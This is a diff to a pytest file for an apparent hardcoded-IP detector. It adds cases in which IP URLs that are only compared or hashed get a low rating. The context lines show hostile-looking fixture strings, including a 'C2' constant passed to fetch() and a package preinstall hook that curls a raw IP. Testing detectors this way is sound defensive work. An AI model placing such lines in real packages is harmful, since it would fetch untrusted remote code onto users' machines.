@@ -1015,6 +1015,20 @@ def test_an_ip_url_as_an_environment_default_is_low(text: str) -> None:
 @pytest.mark.parametrize(
     "text",
     [
+        '  url.origin === "http://211.97.68.49:10020" &&',
+        'ok = ["https://47.116.168.81", "http://47.116.168.81:8788"].includes(url.origin);',
+        'account: createHash("sha256").update("https://47.116.168.81").digest("hex")',
+        "if(['http://47.77.216.1:9200']['includes'](_0x82c6c3['hub'])){}",
+    ],
+)
+def test_an_ip_url_compared_or_hashed_is_low(text: str) -> None:
+    """`hardcoded-ip` v7 (P5)."""
+    assert set(_ips(text)) == {("low", 1.0)}
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
         "get('http://45.33.32.156:8080/p')",
         "const C2 = 'http://45.33.32.156'; fetch(process.env.X || C2)",
         '  "preinstall": "curl ${U:-http://45.33.32.156/x}"',
